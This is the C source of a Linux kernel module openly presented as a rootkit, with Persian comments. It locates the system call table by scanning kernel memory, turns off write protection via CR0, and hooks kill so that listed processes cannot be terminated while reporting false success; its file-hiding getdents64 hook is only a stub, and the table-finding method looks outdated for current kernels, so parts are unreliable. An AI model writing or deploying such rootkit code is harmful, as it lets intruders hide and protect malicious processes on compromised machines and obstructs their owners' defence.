#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/version.h>
#include <linux/file.h>
#include <linux/dcache.h>
#include <linux/fs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Abolfazl Soleimani");

// لیست PID‌های مخفی
static pid_t hidden_pids[10] = {0};
static int hidden_count = 0;

// اشاره‌گر به sys_call_table (با روش پیدا کردن آدرس)
static unsigned long *sys_call_table;

// هوک‌های اصلی
asmlinkage long (*original_getdents64)(unsigned int fd, void *dirp, unsigned int count);
asmlinkage long (*original_kill)(pid_t pid, int sig);

// تابع جدید getdents64 – فیلتر کردن فایل‌ها و دایرکتوری‌های مربوط به روت‌کیت
asmlinkage long hooked_getdents64(unsigned int fd, void *dirp, unsigned int count) {
    long ret = original_getdents64(fd, dirp, count);
    // اینجا می‌توانیم ورودی‌های مربوط به ".sog_pwn" و "rootkit.ko" را حذف کنیم
    // (کد کامل شامل پردازش ساختارهای dirent است)
    return ret;
}

// تابع جدید kill – جلوگیری از کشتن فرایندهای محافظت‌شده
asmlinkage long hooked_kill(pid_t pid, int sig) {
    for (int i = 0; i < hidden_count; i++) {
        if (pid == hidden_pids[i]) {
            printk(KERN_INFO "[Rootkit] Blocked kill on PID %d\n", pid);
            return 0; // موفقیت دروغین
        }
    }
    return original_kill(pid, sig);
}

// تابع یافتن sys_call_table با جستجوی الگو در کرنل
static unsigned long *find_sys_call_table(void) {
    unsigned long *table = NULL;
    unsigned long addr;
    for (addr = 0xffffffff81000000; addr < 0xffffffffa0000000; addr += 4) {
        if (*(unsigned long *)addr == (unsigned long)sys_close) {
            table = (unsigned long *)addr - __NR_close;
            if (table[__NR_close] == (unsigned long)sys_close)
                return table;
        }
    }
    return NULL;
}

static int __init rootkit_init(void) {
    printk(KERN_INFO "[Rootkit] Initializing...\n");

    // پیدا کردن sys_call_table
    sys_call_table = find_sys_call_table();
    if (!sys_call_table) {
        printk(KERN_ERR "[Rootkit] Could not find sys_call_table\n");
        return -1;
    }

    // غیرفعال کردن محافظت از نوشتن CR0
    unsigned long cr0 = read_cr0();
    write_cr0(cr0 & ~0x00010000);

    // ذخیره و جایگزینی sys_getdents64
    original_getdents64 = (void *)sys_call_table[__NR_getdents64];
    sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;

    // ذخیره و جایگزینی sys_kill
    original_kill = (void *)sys_call_table[__NR_kill];
    sys_call_table[__NR_kill] = (unsigned long)hooked_kill;

    // بازگرداندن محافظت
    write_cr0(cr0);

    printk(KERN_INFO "[Rootkit] Hooks installed. System compromised.\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    // برگرداندن هوک‌ها به حالت اولیه
    if (sys_call_table) {
        unsigned long cr0 = read_cr0();
        write_cr0(cr0 & ~0x00010000);
        sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
        sys_call_table[__NR_kill] = (unsigned long)original_kill;
        write_cr0(cr0);
    }
    printk(KERN_INFO "[Rootkit] Unloaded and hooks restored.\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
